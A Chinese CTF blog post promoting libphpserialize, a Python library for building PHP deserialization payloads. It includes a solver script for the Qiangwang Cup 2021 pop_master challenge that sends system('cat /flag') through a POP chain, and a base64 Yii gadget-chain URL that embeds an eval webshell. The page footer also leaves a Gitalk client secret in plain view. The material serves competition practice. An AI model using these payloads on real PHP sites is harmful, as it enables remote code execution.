<blockquote><blockquote>
<p>就单纯想推销一下<a href="https://github.com/frankli0324/libphpserialize">libphpserialize</a></p>
</blockquote>
<h2 id="如何用Python实现PH</blockquote><blockquote><p>就单纯想推销一下<a href="https://github.com/frankli0324/libphpserialize">libphpserialize</a></p></blockquote><h2 id="如何用Python实现PHP的序列化">如何用Python实现PHP的序列化</h2><ol><li>脑补</li><li>写代码</li></ol><h2 id="如何使用libphpserialize">如何使用libphpserialize</h2><h3 id="安装">安装</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install libphpserialize</span><br></pre></td></tr></table></figure><h3 id="使用">使用</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> phpserialize <span class="keyword">import</span> serialize</span><br><span class="line"><span class="built_in">print</span>(serialize(<span class="number">1</span>))</span><br></pre></td></tr></table></figure><p>非常银杏方便</p><h2 id="为什么不用php自己的serialize？">为什么不用php自己的serialize？</h2><ol><li>不用在你的电脑上安装php</li><li>python有requests/httpx，php没有</li><li>简化做题流程</li></ol><p>想象一下这样的场景：</p><p>你在打一个比赛，在做一道反序列化相关的题目。你启动了一个定时销毁的容器，这个容器限时一个小时。你在第50分钟的时候找到了合适的pop链，并用5分钟用python写出了触发反序列化的python poc。</p><p>你慌忙地打开了一个新的文件，将类的定义拷贝了过来，给他们赋了各种属性，然后<code>echo serialize($obj);</code>，结果发现有个private属性，于是又慌忙地改成了 <code>echo urlencode(serialize($obj));</code>，又在命令行中 <code>php generate.php</code>，复制，粘贴进python脚本，执行脚本，最后发现题目里头的反序列化入口处他 <code>base64_decode</code> 了一下，于是又回头去将 <code>urlencode</code> 改成 <code>base64_encode</code>，复制，粘贴，执行python脚本，运行，502，你很愤怒，用浏览器去访问了一下这个链接，发现容器已经过期了。你人麻了。</p><img src="/2021/06/15/Misc/libphpserialize/timeout.png" class=""><p>再想象一下这样的场景：</p><p>你已经成功地构造好了pop链，但是这个链非常长，而且需要精巧地构造属性值。你觉得用python构造这样的属性最简单，但是又不得不print出来然后粘贴到php代码里。你构造好了 <code>system('cat /flag');</code> 的payload，结果发现出题人在 <code>disable_functions</code> 中禁用了system函数。你不得不重新来一遍整个流程，构造属性，复制粘贴，生成序列化串，将序列化串粘回到python脚本里，请求。可是你突然发现你构造出来的序列化后的串突然用不了了，你找了10分钟，最后发现由于终端输出的字符数量限制，你只复制了一半。你非常气愤，直接在python脚本里 <code>payload = input()</code>，然后直接用管道符运行 <code>php generate.php | python3 exp.py</code>，结果发现仍然打不通。你又找了半天，发现php代码里用于调试的几个var_dump没有删。你一怒之下关闭了vscode，打开了LOL，找几个憨批进行一个人的祖安，还破坏了他人的游戏体验。</p><img src="/2021/06/15/Misc/libphpserialize/defeat.jpeg" class=""><p>再想象一下：</p><p>你的队友找到了一条pop链，但是二话不说给你发过来这样一串谜语</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?r&#x3D;site%2Fabout&amp;message&#x3D;TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNzoieWlpXHdlYlxEYlNlc3Npb24iOjE6e3M6MTM6IndyaXRlQ2FsbGJhY2siO2E6Mjp7aTowO086MzI6InlpaVxjYWNoaW5nXEV4cHJlc3Npb25EZXBlbmRlbmN5IjoxOntzOjEwOiJleHByZXNzaW9uIjtzOjIzOiJldmFsKCRfUkVRVUVTVFsiYW50Il0pOyI7fWk6MTtzOjE4OiJldmFsdWF0ZURlcGVuZGVuY3kiO319fQo&#x3D;&amp;ant&#x3D;phpinfo();</span><br></pre></td></tr></table></figure><p>你的眼睛都要看瞎了，可是你访问了这个url，竟然真的打通了。你接下来想继续往进探一探，于是打开了hackbar，痛苦地一个字符一个字符地去改。你题做完了，眼睛也废了。结果你的憨批队友又不想写wp，想让你来写。你想打游戏，于是也贴了这么一大长串。评论区生气了，说你这谁**看得懂。</p><p>如果你有类似的经历，那你可以用libphpserialize来拯救你快乐的一天。</p><h2 id="示例">示例</h2><div class='spoiler collapsed'>    <div class='spoiler-title'>        强网杯2021，pop_master    </div>    <div class='spoiler-content'>        <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> phpserialize <span class="keyword">import</span> serialize</span><br><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> session</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> phply <span class="keyword">import</span> phplex</span><br><span class="line"><span class="keyword">from</span> phply.phpast <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> phply.phpparse <span class="keyword">import</span> make_parser</span><br><span class="line"></span><br><span class="line">ses = session()</span><br><span class="line">classes = &#123;&#125;</span><br><span class="line">func2class = &#123;&#125;</span><br><span class="line">parser = make_parser()</span><br><span class="line">good_paths = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;class.php&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    lexer = phplex.lexer.clone()</span><br><span class="line">    ast = parser.parse(file.read(), lexer=lexer)</span><br><span class="line">    <span class="keyword">for</span> cls <span class="keyword">in</span> ast:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> cls.nodes:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">type</span>(i) <span class="keyword">is</span> Method:</span><br><span class="line">                func2class[i.name] = cls.name</span><br><span class="line">        classes[cls.name] = cls</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_good_assign</span>(<span class="params">ctx_param, node: Assignment</span>):</span></span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">type</span>(node) == Assignment</span><br><span class="line">    <span class="keyword">if</span> ctx_param.name == node.node.name:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">type</span>(node.expr) == BinaryOp:</span><br><span class="line">            <span class="keyword">if</span> node.expr.op == <span class="string">&#x27;.&#x27;</span>:</span><br><span class="line">                <span class="keyword">if</span> node.expr.left.name == ctx_param.name:</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(node)</span><br><span class="line">                <span class="comment"># unexpected</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">type</span>(node.expr) == Variable:</span><br><span class="line">            <span class="keyword">if</span> node.expr.name == ctx_param.name:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">handle_if</span>(<span class="params">ctx_param, node: If</span>):</span></span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">type</span>(node) == If</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span>(node.expr) <span class="keyword">is</span> BinaryOp:</span><br><span class="line">        <span class="comment"># debug</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">eval</span>(<span class="built_in">str</span>(node.expr.left)+node.expr.op+<span class="built_in">str</span>(node.expr.right)):</span><br><span class="line">            <span class="keyword">for</span> n <span class="keyword">in</span> node.node.nodes:</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">type</span>(n) <span class="keyword">is</span> Assignment <span class="keyword">and</span> <span class="keyword">not</span> is_good_assign(ctx_param, n):</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">type</span>(node.expr) <span class="keyword">is</span> FunctionCall:</span><br><span class="line">        <span class="keyword">if</span> node.expr.name == <span class="string">&#x27;method_exists&#x27;</span>:</span><br><span class="line">            func = node.expr.params[<span class="number">1</span>].node</span><br><span class="line">            <span class="keyword">assert</span>(<span class="built_in">type</span>(func) == <span class="built_in">str</span>)</span><br><span class="line">            search(classes[func2class[func]],</span><br><span class="line">                   node.expr.params[<span class="number">0</span>].node.name, func)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;unexpected call&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;unexpected expr&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">handle_method</span>(<span class="params">ctx, method</span>):</span></span><br><span class="line">    ctx.param = method.params[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> method.nodes:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">type</span>(i) <span class="keyword">is</span> For:</span><br><span class="line">            <span class="keyword">for</span> n <span class="keyword">in</span> i.node.nodes:</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">type</span>(n) <span class="keyword">is</span> Assignment <span class="keyword">and</span> <span class="keyword">not</span> is_good_assign(method.params[<span class="number">0</span>], n):</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">type</span>(i) <span class="keyword">is</span> If:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> handle_if(method.params[<span class="number">0</span>], i):</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">type</span>(i) <span class="keyword">is</span> MethodCall:</span><br><span class="line">            search(classes[func2class[i.name]], i.node.name, i.name)</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">type</span>(i) <span class="keyword">is</span> Assignment:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> is_good_assign(method.params[<span class="number">0</span>], i):</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">type</span>(i) <span class="keyword">is</span> Eval:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">search</span>(<span class="params">node, attr, method, path=[]</span>):</span></span><br><span class="line">    path.append((node, attr, method))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> node.nodes:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">type</span>(i) <span class="keyword">is</span> Method <span class="keyword">and</span> i.name == method:</span><br><span class="line">            ctx = <span class="built_in">type</span>(<span class="string">&#x27;&#x27;</span>, (<span class="built_in">object</span>,), &#123;&#125;)()</span><br><span class="line">            <span class="keyword">if</span> handle_method(ctx, i):</span><br><span class="line">                good_paths.append(<span class="built_in">list</span>(path))</span><br><span class="line">    path.pop()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">good_paths = []</span><br><span class="line">search(classes[<span class="string">&#x27;dLEWX3&#x27;</span>], <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;L8IHXt&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(good_paths))</span><br><span class="line"><span class="keyword">for</span> n, a, m <span class="keyword">in</span> good_paths[<span class="number">0</span>]:</span><br><span class="line">    <span class="built_in">print</span>(n.name, a, m)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">prop_call</span>(<span class="params">parent, attr, cls</span>):</span></span><br><span class="line">    <span class="built_in">setattr</span>(parent, attr, <span class="built_in">type</span>(cls, (<span class="built_in">object</span>,), &#123;&#125;)())</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">getattr</span>(parent, attr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">root = <span class="built_in">type</span>(<span class="string">&#x27;dLEWX3&#x27;</span>, (<span class="built_in">object</span>,), &#123;&#125;)()</span><br><span class="line">node = root</span><br><span class="line">path = good_paths[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(path)):</span><br><span class="line">    node = prop_call(node, path[i][<span class="number">1</span>], path[i][<span class="number">0</span>].name)</span><br><span class="line"><span class="built_in">print</span>(serialize(root))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(ses.get(<span class="string">&#x27;http://my_instance.cloudeci1.ichunqiu.com/&#x27;</span>, params=&#123;</span><br><span class="line">    <span class="string">&#x27;pop&#x27;</span>: serialize(root),</span><br><span class="line">    <span class="string">&#x27;argv&#x27;</span>: <span class="string">&#x27;system(&quot;cat /flag&quot;); //&#x27;</span>,</span><br><span class="line">&#125;).text)</span><br></pre></td></tr></table></figure>    </div></div><p>这道题需要解析php源码的ast，并且进行搜索，去掉不可用的假链，找到唯一的一条真链。</p><div class='spoiler collapsed'>    <div class='spoiler-title'>        CTFHUB framework    </div>    <div class='spoiler-content'>        <img src="/2021/06/15/Misc/libphpserialize/yii.jpg" class="">    </div></div><p>这道题是一道比较常规的框架反序列化，payload需要base64_encode后发送</p><p>WIP</p><div id="gitalk-container"></div><script src="https://cdn.bootcss.com/blueimp-md5/2.12.0/js/md5.min.js"></script><link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css"><script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script><script>var gitalkConfig = {"clientID":"5955d155fe2ea768241e","clientSecret":"f96bbda9ff434950217f24f7f9369f8b8de3b025","repo":"frankli0324.github.io","owner":"frankli0324","admin":["frankli0324"],"distractionFreeMode":false};    gitalkConfig.id = md5(location.pathname);var gitalk = new Gitalk(gitalkConfig);    gitalk.render("gitalk-container");    </script><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>